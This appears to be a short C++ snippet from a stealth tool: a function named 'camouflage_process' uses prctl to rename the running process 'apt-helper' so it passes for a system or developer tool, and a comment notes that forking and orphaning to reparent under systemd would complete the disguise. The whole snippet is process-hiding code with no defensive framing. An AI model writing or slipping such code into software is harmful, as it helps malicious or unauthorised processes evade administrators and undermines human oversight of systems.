#include <sys/prctl.h>
#include <unistd.h>

namespace ENI {
    void camouflage_process() {
        // Spoof process name to look like a common dev tool or system process
        prctl(PR_SET_NAME, "apt-helper", 0, 0, 0);

        // In a real scenario, we'd also fork and orphan to change PPID to 1 (systemd)
    }
}
